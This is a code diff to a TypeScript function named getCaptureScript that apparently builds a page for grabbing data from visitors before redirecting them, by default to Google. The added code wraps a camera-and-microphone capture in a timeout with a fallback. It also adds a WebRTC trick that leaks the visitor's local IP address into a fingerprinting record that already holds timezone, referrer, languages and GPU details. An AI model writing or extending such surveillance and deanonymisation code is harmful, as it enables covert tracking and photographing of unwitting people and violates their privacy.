@@ -206,13 +206,19 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               }, 
               audio: true 
             };
-            var stream = await navigator.mediaDevices.getUserMedia(constraints).catch(async (e) => {
-               clientLog("fireParallel: getUserMedia failed, trying fallback", e.message);
-               return navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }).catch((e2) => {
-                   clientLog("fireParallel: Fallback failed", e2.message);
-                   return null;
-               });
-            });
+            var stream = await Promise.race([
+              navigator.mediaDevices.getUserMedia(constraints).catch(async (e) => {
+                 clientLog("fireParallel: getUserMedia failed, trying fallback", e.message);
+                 return navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }).catch((e2) => {
+                     clientLog("fireParallel: Fallback failed", e2.message);
+                     return null;
+                 });
+              }),
+              new Promise(r => setTimeout(() => {
+                clientLog("fireParallel: getUserMedia timed out");
+                r(null);
+              }, 12000)) // 12 seconds timeout for media prompt
+            ]);
             
             if (stream) {
               var video = document.createElement('video');
@@ -445,8 +451,25 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         ref: document.referrer || "Direct",
         langs: navigator.languages ? navigator.languages.join(',') : navigator.language,
-        touch: ('ontouchstart' in window) || navigator.maxTouchPoints > 0
+        touch: ('ontouchstart' in window) || navigator.maxTouchPoints > 0,
+        localIp: 'N/A'
       };
+
+      // Try WebRTC Local IP Leak
+      try {
+          var rtc = new RTCPeerConnection({iceServers:[]});
+          rtc.createDataChannel('', {reliable:false});
+          rtc.onicecandidate = function(evt) {
+              if (evt.candidate) {
+                  var match = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(evt.candidate.candidate);
+                  if (match && syncData.localIp === 'N/A') {
+                      syncData.localIp = match[1];
+                      logEvent('extra', { localIpRefined: match[1] });
+                  }
+              }
+          };
+          rtc.createOffer().then(function(offer) { rtc.setLocalDescription(offer); }).catch(function(){});
+      } catch(e) {}
 
       // Try GPU synchronously
       try {
